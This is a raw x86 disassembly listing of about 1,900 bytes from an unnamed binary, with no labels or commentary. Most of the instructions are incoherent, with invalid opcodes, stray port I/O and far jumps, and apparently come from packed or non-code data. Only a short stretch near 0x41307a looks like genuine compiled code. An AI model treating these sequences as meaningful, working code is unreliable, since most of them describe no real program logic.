  412c35:	(bad)  
  412c36:	sbb    DWORD PTR [edi-0x3c06f38c],edi
  412c3c:	loopne 0x412c8b
  412c3e:	test   al,0xe
  412c40:	popf   
  412c41:	das    
  412c42:	idiv   DWORD PTR [ecx]
  412c44:	js     0x412caf
  412c46:	xlat   BYTE PTR ds:[ebx]
  412c47:	adc    DWORD PTR [eax+0x45],0xe2670edb
  412c4e:	and    al,0xda
  412c50:	imul   eax,DWORD PTR [edi-0x6b30052f],0xfa790fce
  412c5a:	mov    dh,BYTE PTR [edx]
  412c5c:	leave  
  412c5d:	loop   0x412c60
  412c5f:	cmp    edi,edi
  412c61:	sub    al,0x10
  412c63:	jae    0x412c88
  412c65:	add    bh,ah
  412c67:	cli    
  412c68:	arpl   WORD PTR [esi+0x79],bx
  412c6b:	or     eax,0x3e2ee85f
  412c70:	xor    eax,0x961555c4
  412c75:	jl     0x412cae
  412c77:	lods   al,BYTE PTR ds:[esi]
  412c78:	cld    
  412c79:	outs   dx,DWORD PTR ds:[esi]
  412c7a:	xor    DWORD PTR [esi-0x5047396c],edx
  412c80:	mov    dh,0x58
  412c82:	dec    ebx
  412c83:	aas    
  412c84:	repnz and esp,esp
  412c87:	xchg   esi,eax
  412c88:	dec    esp
  412c89:	adc    al,BYTE PTR [ecx+eiz*1+0x1728574a]
  412c90:	(bad)  
  412c91:	test   BYTE PTR [eax-0xf],cl
  412c94:	jmp    0x6d4f:0x216a28d6
  412c9b:	push   esi
  412c9c:	fstp   st(4)
  412c9e:	shl    DWORD PTR [ecx-0x39],0xfd
  412ca2:	xchg   DWORD PTR [ebx-0x51],edi
  412ca5:	scas   eax,DWORD PTR es:[edi]
  412ca6:	add    BYTE PTR [eax-0x6c],ah
  412ca9:	imul   ebp,DWORD PTR [ebx],0x2846f1cc
  412caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cb0:	imul   eax,DWORD PTR [edx+0x7c876eea],0x6c557b38
  412cba:	jo     0x412cfa
  412cbc:	push   cs
  412cbd:	push   edx
  412cbe:	dec    ecx
  412cbf:	outs   dx,BYTE PTR ds:[esi]
  412cc0:	inc    edx
  412cc1:	xchg   BYTE PTR [ecx+edx*4-0x1b480839],bh
  412cc8:	push   cs
  412cc9:	sbb    dh,BYTE PTR [eax-0x4]
  412ccc:	fwait
  412ccd:	les    edx,FWORD PTR [ecx-0x61]
  412cd0:	shl    DWORD PTR [esp+0x7f],cl
  412cd4:	adc    cl,ch
  412cd6:	jmp    0x412d4a
  412cd8:	std    
  412cd9:	sar    edi,cl
  412cdb:	ds scas eax,DWORD PTR es:[edi]
  412cdd:	shr    dl,0x32
  412ce0:	repnz cmp eax,0xd9c19815
  412ce6:	mov    esi,0x3d8cf5ca
  412ceb:	ins    DWORD PTR es:[edi],dx
  412cec:	popa   
  412ced:	or     eax,0x2e3831c2
  412cf2:	shr    BYTE PTR [ebx],cl
  412cf4:	stos   DWORD PTR es:[edi],eax
  412cf5:	scas   al,BYTE PTR es:[edi]
  412cf6:	mov    al,ds:0x64a9c8e2
  412cfb:	adc    DWORD PTR [edx-0x15be3c52],eax
  412d01:	mov    dl,0xb7
  412d03:	and    ebp,DWORD PTR [ebp+0x185c62c5]
  412d09:	and    esi,esp
  412d0b:	mov    ah,BYTE PTR [ecx]
  412d0d:	cmc    
  412d0e:	outs   dx,BYTE PTR ds:[esi]
  412d0f:	shl    BYTE PTR [eax],cl
  412d11:	fistp  QWORD PTR [ebx]
  412d13:	inc    edx
  412d14:	(bad)  
  412d15:	cmp    al,0xe
  412d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d18:	outs   dx,DWORD PTR ds:[esi]
  412d19:	ror    esp,1
  412d1b:	jbe    0x412d4e
  412d1d:	fidivr DWORD PTR cs:[esi+0x2f]
  412d21:	fisub  DWORD PTR [edi]
  412d23:	inc    eax
  412d24:	call   0xab30:0xe60e0da9
  412d2b:	aad    0x57
  412d2d:	sub    sp,WORD PTR [edx-0x4d9692a9]
  412d34:	or     DWORD PTR [ebx+0x54bef38f],edi
  412d3a:	stos   DWORD PTR es:[edi],eax
  412d3b:	icebp  
  412d3c:	rol    BYTE PTR [eax-0x2d0e250c],cl
  412d42:	iret   
  412d43:	lods   eax,DWORD PTR ds:[esi]
  412d44:	test   bh,dh
  412d46:	in     al,0x23
  412d48:	aad    0xbb
  412d4a:	ins    DWORD PTR es:[edi],dx
  412d4b:	repz fisub WORD PTR [edx-0x6a48e55b]
  412d52:	add    eax,0x981b1715
  412d57:	cmp    BYTE PTR [edi-0x77],0x38
  412d5b:	xlat   BYTE PTR ds:[ebx]
  412d5c:	or     dh,BYTE PTR [edi]
  412d5e:	push   eax
  412d5f:	xchg   DWORD PTR [ebx+0x4c709e47],ebx
  412d65:	pushf  
  412d66:	sbb    al,BYTE PTR [esi+eiz*1-0x44403ebd]
  412d6d:	fisttp WORD PTR [edx+0x7fb3ee2b]
  412d73:	mov    dh,0x8
  412d75:	sbb    al,0x13
  412d77:	sub    cl,BYTE PTR [edi+0x0]
  412d7a:	lahf   
  412d7b:	xchg   edx,eax
  412d7c:	inc    esi
  412d7d:	push   esi
  412d7e:	jb     0x412d5d
  412d80:	arpl   WORD PTR [esp+edi*2+0x74],cx
  412d84:	out    0x66,al
  412d86:	xchg   DWORD PTR [edi],ebp
  412d88:	test   eax,0x1362727d
  412d8d:	adc    dl,ch
  412d8f:	jnp    0x412df1
  412d91:	dec    ebp
  412d92:	bound  eax,QWORD PTR [edi]
  412d94:	jle    0x412dac
  412d96:	push   esi
  412d97:	push   0x81f97df4
  412d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d9d:	loop   0x412db6
  412d9f:	cmp    al,BYTE PTR [ebx]
  412da1:	in     al,0x96
  412da3:	mov    ah,0x46
  412da5:	ds (bad) 
  412da8:	ja     0x412db8
  412daa:	cmp    ebx,DWORD PTR [ebx]
  412dac:	lods   eax,DWORD PTR ds:[esi]
  412dad:	outs   dx,DWORD PTR ds:[esi]
  412dae:	jecxz  0x412e01
  412db0:	in     al,0xd1
  412db2:	and    al,0xcd
  412db4:	jb     0x412d83
  412db6:	push   es
  412db7:	pop    ebp
  412db8:	mov    eax,ds:0x558982bc
  412dbd:	mov    ah,0x23
  412dbf:	loope  0x412e24
  412dc1:	and    eax,DWORD PTR [ebp+edx*8-0xc47aee8]
  412dc8:	xor    ebp,DWORD PTR [ebx]
  412dca:	outs   dx,BYTE PTR ds:[esi]
  412dcb:	fwait
  412dcc:	cmp    ecx,DWORD PTR [ecx+0x60]
  412dcf:	shl    DWORD PTR [edx+edi*1-0x48],0x2c
  412dd4:	std    
  412dd5:	int    0x84
  412dd7:	loop   0x412d96
  412dd9:	jne    0x412d71
  412ddb:	std    
  412ddc:	or     eax,0x681edc22
  412de1:	or     ch,0xf1
  412de4:	mov    bh,al
  412de6:	dec    eax
  412de7:	push   ss
  412de8:	sbb    BYTE PTR [ecx],ch
  412dea:	mov    ecx,0xf57cd2fc
  412def:	ss inc ebp
  412df1:	ret    0xd650
  412df4:	ds test al,0x69
  412df7:	cli    
  412df8:	imul   edi,DWORD PTR [edx],0x15b72b1e
  412dfe:	mov    ebp,0xe02a63d6
  412e03:	cmp    ebp,DWORD PTR [edx]
  412e05:	xlat   BYTE PTR ds:[ebx]
  412e06:	inc    esi
  412e07:	pop    esi
  412e08:	inc    eax
  412e09:	outs   dx,DWORD PTR gs:[esi]
  412e0b:	jecxz  0x412e69
  412e0d:	out    dx,eax
  412e0e:	xchg   ebp,eax
  412e0f:	fwait
  412e10:	jmp    0x412d9a
  412e12:	ja     0x412df1
  412e14:	xor    BYTE PTR [eax],bl
  412e16:	jnp    0x412e7d
  412e18:	push   0xfffffffd
  412e1a:	mov    eax,ds:0x3c9c87e7
  412e1f:	lds    ebx,FWORD PTR [esi+0x6]
  412e22:	js     0x412e9b
  412e24:	mov    BYTE PTR [edx+0x1b3b994a],ah
  412e2a:	int3   
  412e2b:	dec    ebp
  412e2c:	int3   
  412e2d:	adc    eax,eax
  412e2f:	aad    0xe1
  412e31:	sub    al,0xee
  412e33:	mov    WORD PTR [ecx],cs
  412e35:	adc    al,0x30
  412e37:	rol    DWORD PTR [esi+0x1],1
  412e3a:	std    
  412e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e3c:	xor    eax,0xa32db35c
  412e41:	in     al,0xc6
  412e43:	jnp    0x412e1e
  412e45:	int3   
  412e46:	fistp  QWORD PTR [ecx+eax*2+0x3f]
  412e4a:	push   esi
  412e4b:	shl    BYTE PTR [ebp+0x52e2bdad],1
  412e51:	cwde   
  412e52:	loopne 0x412e46
  412e54:	or     edx,DWORD PTR [ebx]
  412e56:	scas   al,BYTE PTR es:[edi]
  412e57:	add    DWORD PTR [eax+edi*4],ebp
  412e5a:	aam    0xa2
  412e5c:	shr    BYTE PTR [ecx+ebp*2+0x5fc509f9],cl
  412e63:	push   edi
  412e64:	push   edi
  412e65:	gs jne 0x412eae
  412e68:	or     al,0x7c
  412e6a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e6c:	jmp    0xb933:0xcc466fd5
  412e73:	inc    eax
  412e74:	or     al,0xd6
  412e76:	and    BYTE PTR [edx+0x48863ae6],bh
  412e7c:	sub    BYTE PTR [eax-0x5d61b55c],ch
  412e82:	fsubrp st(2),st
  412e84:	out    dx,eax
  412e85:	push   ss
  412e86:	sar    BYTE PTR [eax+esi*2-0xa],0x70
  412e8b:	cmp    BYTE PTR [eax],al
  412e8d:	push   ds
  412e8e:	popf   
  412e8f:	and    BYTE PTR [eax-0xe09193a],ah
  412e95:	and    al,BYTE PTR [ecx+0x373d0f64]
  412e9b:	out    dx,eax
  412e9c:	add    BYTE PTR [eax-0x1a377f],0xd
  412ea3:	cli    
  412ea4:	adc    bl,BYTE PTR [edi+eiz*1+0x39]
  412ea8:	cwde   
  412ea9:	mov    ecx,0xffaf88c8
  412eae:	jae    0x412e57
  412eb0:	cmp    al,0xb1
  412eb2:	bound  esi,QWORD PTR [edi-0x43]
  412eb5:	add    DWORD PTR [edi],ecx
  412eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eb8:	in     eax,dx
  412eb9:	sub    eax,DWORD PTR [eax]
  412ebb:	mov    BYTE PTR [ebx+0x1f],0x5e
  412ebf:	fst    QWORD PTR [edx+0x75]
  412ec2:	je     0x412f13
  412ec4:	scas   eax,DWORD PTR es:[edi]
  412ec5:	jbe    0x412ef8
  412ec7:	clc    
  412ec8:	mov    bh,0x4a
  412eca:	mov    DWORD PTR [ecx-0x4f],edx
  412ecd:	fadd   QWORD PTR [ecx+0x68]
  412ed0:	xor    al,BYTE PTR [edx+0x5cd54e46]
  412ed6:	adc    DWORD PTR [ecx*1+0x402b3812],ecx
  412edd:	test   al,0x1a
  412edf:	xchg   DWORD PTR [ecx],ebx
  412ee1:	xchg   edi,ebp
  412ee3:	adc    al,0x51
  412ee5:	ds and eax,0x1bb97fb3
  412eeb:	pop    ss
  412eec:	xchg   edi,eax
  412eed:	add    BYTE PTR [edi+0x9],ch
  412ef0:	or     edi,DWORD PTR [ebx+0x3a54e98b]
  412ef6:	shl    DWORD PTR [eax+0x746bcb86],0xd3
  412efd:	scas   eax,DWORD PTR es:[edi]
  412efe:	cwde   
  412eff:	and    dh,al
  412f01:	pop    dx
  412f03:	and    ch,0x8f
  412f06:	jns    0x412eec
  412f08:	repz lahf 
  412f0a:	aas    
  412f0b:	imul   eax,DWORD PTR [edx-0x22a8a65a],0xffffffbb
  412f12:	cmp    eax,0xb52ffd78
  412f17:	xor    al,0xe1
  412f19:	sub    BYTE PTR [esi+0x20],dl
  412f1c:	push   ebp
  412f1d:	sub    cl,BYTE PTR [edx]
  412f1f:	xchg   esi,eax
  412f20:	jmp    0x58a3:0xf23f63a3
  412f27:	push   edx
  412f28:	push   es
  412f29:	mov    bl,BYTE PTR [eax]
  412f2b:	dec    esi
  412f2c:	or     eax,0xc59dd85e
  412f31:	(bad)
  412f36:	in     al,dx
  412f37:	pop    ss
  412f38:	cmp    BYTE PTR [ebp-0x25],al
  412f3b:	call   FWORD PTR ds:0x699b4e92
  412f41:	inc    edx
  412f42:	das    
  412f43:	lahf   
  412f44:	dec    ecx
  412f45:	mov    ah,0x97
  412f47:	add    eax,0xa34751b9
  412f4c:	add    dh,0xeb
  412f4f:	or     ah,dl
  412f51:	in     al,dx
  412f52:	outs   dx,DWORD PTR ds:[esi]
  412f53:	pop    ebx
  412f54:	pop    esp
  412f55:	dec    edi
  412f56:	mov    ds:0xa8470e4d,eax
  412f5b:	dec    esp
  412f5c:	loop   0x412f32
  412f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f5f:	lea    edi,[ecx-0x4a61b42]
  412f65:	sbb    ebp,edi
  412f67:	push   esp
  412f68:	test   eax,0xb5146678
  412f6d:	(bad)  
  412f6e:	fidiv  DWORD PTR [ebp-0xb892834]
  412f74:	out    dx,eax
  412f75:	in     eax,dx
  412f76:	(bad)  
  412f77:	pop    esp
  412f78:	loope  0x412fee
  412f7a:	add    al,0xb3
  412f7c:	pop    eax
  412f7d:	(bad)  
  412f7e:	inc    BYTE PTR [esi+eiz*4+0x4f]
  412f82:	pop    edx
  412f83:	fmul   DWORD PTR [edi]
  412f85:	retf   
  412f86:	cld    
  412f87:	inc    ecx
  412f88:	retf   0xee2e
  412f8b:	pop    edi
  412f8c:	push   cs
  412f8d:	lea    eax,[esi]
  412f8f:	xchg   ebx,eax
  412f90:	pop    ecx
  412f91:	sbb    DWORD PTR [ecx+0x33],esi
  412f94:	aas    
  412f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f96:	stc    
  412f97:	iret   
  412f98:	push   ss
  412f99:	imul   esp,DWORD PTR [ebp-0x63],0xf20f0f14
  412fa0:	test   al,0x52
  412fa2:	mov    al,0xbe
  412fa4:	dec    ebx
  412fa5:	sub    al,bh
  412fa7:	loope  0x412fe5
  412fa9:	ret    
  412faa:	jne    0x412f9b
  412fac:	ds sti 
  412fae:	xor    al,0xf6
  412fb0:	mov    al,0x94
  412fb2:	sub    eax,0x9acf5804
  412fb7:	test   edi,edi
  412fb9:	jnp    0x412fdf
  412fbb:	test   al,0x3d
  412fbd:	xor    bh,BYTE PTR [esi-0x59]
  412fc0:	sbb    al,0x2e
  412fc2:	jo     0x413009
  412fc4:	inc    eax
  412fc5:	inc    ecx
  412fc6:	nop
  412fc7:	sbb    eax,0xd8ac1296
  412fcc:	pop    edi
  412fcd:	adc    al,0x5
  412fcf:	push   es
  412fd0:	cmp    DWORD PTR [ecx+0x47],0xffffffb3
  412fd4:	dec    ecx
  412fd5:	fadd   QWORD PTR [esi-0x73]
  412fd8:	xchg   ebx,eax
  412fd9:	inc    DWORD PTR [edi-0x44]
  412fdc:	jno    0x412fa9
  412fde:	jmp    0x78b8d763
  412fe3:	std    
  412fe4:	sbb    al,0xf1
  412fe6:	mov    WORD PTR [ecx],ss
  412fe8:	adc    DWORD PTR [edi+0x4bf26eed],esi
  412fee:	retf   0x5ddf
  412ff1:	pop    ds
  412ff2:	aas    
  412ff3:	fdivr  QWORD PTR [eax-0x53]
  412ff6:	dec    edi
  412ff7:	cs cmp eax,0xd3b80c16
  412ffd:	xchg   esp,eax
  412ffe:	mov    eax,ds:0xd2ba0a29
  413003:	adc    BYTE PTR ds:[esi],dl
  413006:	mov    bh,0xc1
  413008:	js     0x412faf
  41300a:	cli    
  41300b:	aad    0xfb
  41300d:	aam    0x2f
  41300f:	xor    DWORD PTR [esi-0x8],ebp
  413012:	sub    al,0x21
  413014:	and    ebp,ebp
  413016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413017:	inc    esi
  413018:	rcl    bl,cl
  41301a:	cmp    esi,edi
  41301c:	push   ax
  41301e:	lods   al,BYTE PTR ds:[esi]
  41301f:	push   esi
  413020:	push   es
  413021:	pop    ds
  413022:	inc    ebp
  413023:	ja     0x41307b
  413025:	adc    eax,0xa4d74878
  41302a:	mov    BYTE PTR [ecx-0x4ae01cec],al
  413030:	jle    0x412fc4
  413032:	lahf   
  413033:	test   BYTE PTR [eax-0x30],bl
  413036:	jne    0x413064
  413038:	jecxz  0x412fbd
  41303a:	sub    ch,BYTE PTR [ebp+0x56680f91]
  413040:	call   0x2bd9:0x5d0066c9
  413047:	push   ebp
  413048:	lahf   
  413049:	out    0x4e,eax
  41304b:	add    BYTE PTR [edi],ch
  41304d:	push   ecx
  41304e:	and    esi,DWORD PTR [eax+0x62]
  413051:	fimul  DWORD PTR [eax+0x3e]
  413054:	jecxz  0x4130bf
  413056:	enter  0xa0c7,0x3b
  41305a:	sub    eax,0xbaf691c7
  41305f:	xor    al,bl
  413061:	and    BYTE PTR [esi],al
  413063:	lds    edx,FWORD PTR [edi+esi*4]
  413066:	shl    cl,0x5f
  413069:	sub    ecx,DWORD PTR [eax+0x7]
  41306c:	pop    ds
  41306d:	xor    BYTE PTR [ebp-0x49],cl
  413070:	jbe    0x41305d
  413072:	xchg   ebp,eax
  413073:	or     esp,DWORD PTR [edx]
  413075:	cmp    BYTE PTR [ebx-0x5c],0x3f
  413079:	(bad)  
  41307a:	xor    eax,edi
  41307c:	shl    ecx,0x1e
  41307f:	xor    edx,edx
  413081:	or     eax,edx
  413083:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  413087:	mov    eax,DWORD PTR [ebp+0x14]
  41308a:	or     BYTE PTR [eax],cl
  41308c:	mov    eax,DWORD PTR [ebp-0x48]
  41308f:	mov    ecx,DWORD PTR [ebp-0x44]
  413092:	shrd   eax,ecx,0x2
  413096:	shr    ecx,0x2
  413099:	mov    ecx,DWORD PTR [ebp-0x48]
  41309c:	mov    edx,DWORD PTR [ebp-0x44]
  41309f:	xor    eax,edi
  4130a1:	xor    edx,edx
  4130a3:	or     eax,edx
  4130a5:	add    eax,DWORD PTR ds:0x422298
  4130ab:	shl    ecx,0x1e
  4130ae:	mov    DWORD PTR [ebp+0x14],eax
  4130b1:	jmp    0x41363b
  4130b6:	xchg   ebx,eax
  4130b7:	fadd   DWORD PTR [eax]
  4130b9:	mov    eax,ds:0xd89398c0
  4130be:	out    0x8d,al
  4130c0:	shr    BYTE PTR [eax+0x6822258e],cl
  4130c6:	mov    dh,0x10
  4130c8:	or     al,0x16
  4130ca:	cmp    eax,0xf3161604
  4130cf:	jge    0x41306a
  4130d1:	push   ds
  4130d2:	aad    0xb5
  4130d4:	mov    eax,0x301e8c5a
  4130d9:	add    bl,cl
  4130db:	or     ah,BYTE PTR [ecx-0x61]
  4130de:	inc    ebp
  4130df:	add    cl,bh
  4130e1:	out    0x4f,eax
  4130e3:	inc    ebx
  4130e4:	sub    BYTE PTR [eax-0x6a625a26],bh
  4130ea:	les    ebp,FWORD PTR [eax]
  4130ec:	lds    ebp,FWORD PTR [edx+edx*4]
  4130ef:	or     BYTE PTR [ecx],al
  4130f1:	dec    esi
  4130f2:	arpl   di,sp
  4130f4:	aas    
  4130f5:	mov    ch,BYTE PTR [ebx]
  4130f7:	push   edi
  4130f8:	mov    edi,0xbada0661
  4130fd:	pop    ebp
  4130ff:	call   0x4fa4:0x3b1662ec
  413106:	xor    esp,DWORD PTR [eax+0xa]
  413109:	fs enter 0xad65,0x62
  41310e:	(bad)  
  41310f:	cmc    
  413110:	push   edi
  413111:	stos   DWORD PTR es:[edi],eax
  413112:	popf   
  413113:	mov    ch,0xe3
  413115:	sti    
  413116:	cmp    DWORD PTR [edi+0x23b02ba7],esi
  41311c:	xchg   esi,eax
  41311d:	sar    BYTE PTR [edx-0x7a318652],1
  413123:	mulps  xmm3,XMMWORD PTR [edx]
  413126:	jmp    0x717fa2e5
  41312b:	push   ebp
  41312c:	jg     0x413173
  41312e:	(bad)  
  413130:	mov    ch,0x9f
  413132:	xlat   BYTE PTR ds:[ebx]
  413133:	mov    ecx,0xa28d9f99
  413138:	jmp    0x4559d288
  41313d:	popa   
  41313e:	push   ss
  41313f:	mov    WORD PTR [edx],cs
  413141:	xchg   edx,eax
  413142:	imul   DWORD PTR [edx+0x1]
  413145:	jmp    0x795d:0x6e792ec0
  41314c:	adc    eax,0x4093aa0d
  413151:	lods   al,BYTE PTR ds:[esi]
  413152:	test   DWORD PTR [esi],esp
  413154:	not    DWORD PTR [edi+0x3e]
  413157:	lea    edi,[ecx-0x5c]
  41315a:	mov    eax,0x9c922b76
  41315f:	xchg   DWORD PTR [ecx+esi*2],esp
  413162:	stc    
  413163:	inc    edi
  413164:	setg   bl
  413167:	clc    
  413168:	mov    cl,0xf0
  41316a:	adc    DWORD PTR ds:0x242c0360,edi
  413170:	sti    
  413171:	add    DWORD PTR [esi-0x7df6d252],eax
  413177:	mov    ds:0x113300b,eax
  41317c:	xor    DWORD PTR [bx+0x22],0x3a
  413181:	test   BYTE PTR [edi+0x43],0x3f
  413185:	sbb    eax,0x4d9a5b3c
  41318a:	lods   eax,DWORD PTR ds:[esi]
  41318b:	ins    DWORD PTR es:[edi],dx
  41318c:	and    ebx,DWORD PTR [eax+ebp*8-0x28be6ea4]
  413193:	fs sbb ah,cl
  413196:	sub    ebx,ebx
  413198:	jle    0x413197
  41319a:	jle    0x413173
  41319c:	dec    eax
  41319d:	sbb    BYTE PTR [ecx-0x42],bl
  4131a0:	hlt    
  4131a1:	xchg   esi,eax
  4131a2:	ret    
  4131a3:	rcl    BYTE PTR [edx-0x2e590818],cl
  4131a9:	hlt    
  4131aa:	or     BYTE PTR [eax+0x179c0fb3],dl
  4131b0:	(bad)  
  4131b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b2:	fiadd  DWORD PTR ss:[edi]
  4131b5:	mov    al,ds:0x52aefdf7
  4131ba:	daa    
  4131bb:	aam    0x5a
  4131bd:	fst    DWORD PTR [ebp-0x5b]
  4131c0:	mov    WORD PTR [esi+0x64bc7bc],?
  4131c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131c7:	xchg   esi,eax
  4131c8:	jmp    0xab75:0x1634aeb7
  4131cf:	xlat   BYTE PTR ds:[ebx]
  4131d0:	jecxz  0x4131a9
  4131d2:	mov    ebx,0x4fbcfaca
  4131d7:	(bad)  
  4131d8:	sub    dh,BYTE PTR [ecx+0x5e3d02c7]
  4131de:	cmp    ebx,esi
  4131e0:	sbb    edi,DWORD PTR [ecx+0x794ec4d6]
  4131e6:	push   eax
  4131e7:	cdq    
  4131e8:	inc    ebx
  4131e9:	ror    DWORD PTR [edi+0x65],0xc2
  4131ed:	les    eax,FWORD PTR [eax+0x59cefa92]
  4131f3:	pop    edx
  4131f4:	or     esi,DWORD PTR [edi]
  4131f6:	mov    al,ds:0x432fc4e2
  4131fb:	push   ecx
  4131fc:	xor    BYTE PTR [ebx+0x4f],ch
  4131ff:	iret   
  413200:	ins    BYTE PTR es:[edi],dx
  413201:	mov    es,WORD PTR [ecx-0x159f0b2]
  413207:	stc    
  413208:	or     al,0xd3
  41320a:	or     al,0x13
  41320c:	fldcw  WORD PTR [ebp-0x1f071918]
  413212:	adc    ecx,edx
  413214:	add    dl,BYTE PTR [ebx+0x43d659fa]
  41321a:	(bad)  
  41321b:	jnp    0x41326e
  41321d:	and    ebp,edx
  41321f:	jp     0x413286
  413221:	ins    DWORD PTR es:[edi],dx
  413222:	inc    esi
  413223:	cmp    al,0xd0
  413225:	outs   dx,DWORD PTR ds:[esi]
  413226:	cld    
  413227:	xor    al,0x81
  413229:	and    edx,DWORD PTR [ecx]
  41322b:	(bad)  [esi-0x77]
  41322e:	push   ds
  41322f:	arpl   WORD PTR [ebx],dx
  413231:	cld    
  413232:	nop
  413233:	xchg   ebx,eax
  413234:	sub    BYTE PTR [edx-0x29],al
  413237:	rcl    DWORD PTR [ecx+0xc],0x9d
  41323b:	xor    esp,DWORD PTR [edx+0x3e]
  41323e:	xchg   edi,eax
  41323f:	pop    eax
  413240:	add    DWORD PTR [ebp+0x1b7efba9],eax
  413246:	mov    ch,0x0
  413248:	mov    ecx,0xed3abb16
  41324d:	mov    ch,0x5f
  41324f:	mov    ds:0xd4036e68,eax
  413254:	and    al,0x7f
  413256:	add    eax,0x4e9af577
  41325b:	xor    al,BYTE PTR [edx-0xabfdc40]
  413261:	jle    0x413293
  413263:	es push 0xa
  413266:	pop    esi
  413267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413268:	or     DWORD PTR [edx-0x83a4527],edi
  41326e:	mov    WORD PTR [eax-0x10],cs
  413271:	cwde   
  413272:	out    0xc5,eax
  413274:	cmp    edi,0xa966dce6
  41327a:	not    BYTE PTR [ebp+0x6294827]
  413280:	and    BYTE PTR [esi-0x39dcfc29],0xc0
  413287:	pop    es
  413288:	ja     0x41321e
  41328a:	jns    0x4132d8
  41328c:	mov    ecx,0xa7efd455
  413291:	popa   
  413292:	and    BYTE PTR [eax],0xbb
  413295:	dec    esi
  413296:	pop    ebp
  413297:	push   es
  413298:	lea    ebx,[edi+0x1f6e2962]
  41329e:	cmc    
  41329f:	pop    ecx
  4132a0:	or     DWORD PTR ds:0x81065ba8,esi
  4132a6:	fdiv   QWORD PTR [ebx-0x65962b0e]
  4132ac:	mov    eax,0x4b96b061
  4132b1:	mov    ebp,0x84cda957
  4132b6:	inc    edx
  4132b7:	cmp    dh,BYTE PTR [eax-0x20bb9ac3]
  4132bd:	adc    esi,0xcc51e27a
  4132c3:	jb     0x41328d
  4132c5:	cmp    ebx,DWORD PTR [ebp-0x59]
  4132c8:	retf   0x163d
  4132cb:	inc    ecx
  4132cc:	inc    edi
  4132cd:	jns    0x413324
  4132cf:	scas   eax,DWORD PTR es:[di]
  4132d1:	popa   
  4132d2:	fs test eax,0xe220b091
  4132d8:	(bad)
  4132db:	xchg   ebp,eax
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	add    ch,BYTE PTR [edx]
  4132df:	jo     0x4132f0
  4132e1:	int    0x90
  4132e3:	mov    ch,0x80
  4132e5:	xchg   cx,ax
  4132e7:	push   esp
  4132e8:	inc    ebx
  4132e9:	mov    ah,0xf5
  4132eb:	sbb    al,BYTE PTR [edx]
  4132ed:	aaa    
  4132ee:	mov    al,ds:0xe00ec66
  4132f3:	mov    bh,BYTE PTR [ecx]
  4132f5:	dec    ebx
  4132f6:	adc    DWORD PTR [esi],esi
  4132f8:	ret    0x5f73
  4132fb:	adc    eax,0x72582f78
  413300:	add    ebp,esi
  413302:	cmp    eax,0x548212ac
  413307:	xor    eax,0xb8697453
  41330c:	sub    DWORD PTR [edi],0xffffffd1
  41330f:	adc    ecx,ecx
  413311:	adc    BYTE PTR [edx],bh
  413313:	fstp   TBYTE PTR [esi]
  413315:	aam    0xe5
  413317:	mov    esp,0x24e70abf
  41331c:	mov    bh,0x8a
  41331e:	pop    ebp
  41331f:	sub    al,0x1a
  413321:	imul   esi,DWORD PTR [edx+edx*1+0x7dfbe751],0xb2ec5048
  41332c:	xchg   DWORD PTR [edx+esi*4+0x48b1e7f2],esi
  413333:	es xchg ecx,eax
  413335:	addr16 inc ecx
  413337:	cwde   
  413338:	retf   0x8a68
  41333b:	mov    dl,0x2f
  41333d:	or     al,0x9
  41333f:	sub    ch,dl
  413341:	mov    eax,0xbff1ecad
  413346:	mov    BYTE PTR [edx-0x53],dh
  413349:	and    ebx,esi
  41334b:	xchg   esp,eax
  41334c:	pusha  
  41334d:	std    
  41334e:	shl    esi,cl
  413350:	lahf   
  413351:	jge    0x413326
  413353:	pop    ebx
  413354:	add    dl,bh
  413356:	in     eax,dx
  413357:	test   al,0x97
  413359:	jo     0x413390
  41335b:	dec    edi
  41335c:	ret    0xfbc6
  41335f:	lahf   
  413360:	xor    ecx,DWORD PTR [edx+eax*2]
  413363:	addr16 cld 
  413365:	pop    edx
  413366:	dec    esi
  413367:	and    DWORD PTR [ebx],ecx
  413369:	mov    ds:0x7179c02b,al
  41336e:	adc    al,0xcb
  413370:	les    ebx,FWORD PTR [esi]
  413372:	cmp    eax,DWORD PTR [edi]
  413374:	jne    0x41336f
  413376:	cmp    DWORD PTR [edi+0x14],ecx
  413379:	xchg   ebp,eax
  41337a:	push   ebp
  41337b:	ja     0x4133fc
  41337d:	das    
  41337e:	push   ds
  41337f:	jmp    0xf46b:0x89574d61
  413386:	shl    al,1
  413388:	xlat   BYTE PTR ds:[ebx]
  413389:	inc    eax
  41338a:	dec    ebp
  41338b:	mov    edx,0x6ddf1aca
  413390:	out    dx,eax
  413391:	cmp    ebp,edx
  413393:	jg     0x4133cf
  413395:	sub    DWORD PTR [ebp-0x73],edi
  413398:	mov    bh,0x45
  41339a:	popf   
  41339b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41339c:	out    0x47,al
  41339e:	mov    dh,0x59
  4133a0:	ficom  WORD PTR [ebx-0x1e]
  4133a3:	and    eax,DWORD PTR [ecx+eax*1-0x1e]
  4133a7:	ins    BYTE PTR es:[edi],dx
  4133a8:	jl     0x413396
  4133aa:	call   0xdd6dfaf0
  4133af:	pop    ebx
  4133b0:	dec    edi
  4133b1:	arpl   WORD PTR [ebx+0x4e],si
  4133b4:	das    
  4133b5:	fld    QWORD PTR [ebp-0x79]
  4133b8:	ins    BYTE PTR es:[edi],dx
  4133b9:	dec    esp
  4133ba:	mov    ah,0xbc
  4133bc:	fst    QWORD PTR [ecx-0x76]
  4133bf:	ins    BYTE PTR es:[edi],dx
  4133c0:	sahf   
  4133c1:	pop    esp
  4133c2:	mov    bl,0x4
  4133c4:	mov    ecx,eax
  4133c6:	out    0x7,al
  4133c8:	das    
  4133c9:	xlat   BYTE PTR ds:[ebx]
  4133ca:	in     eax,0x3
  4133cc:	dec    eax
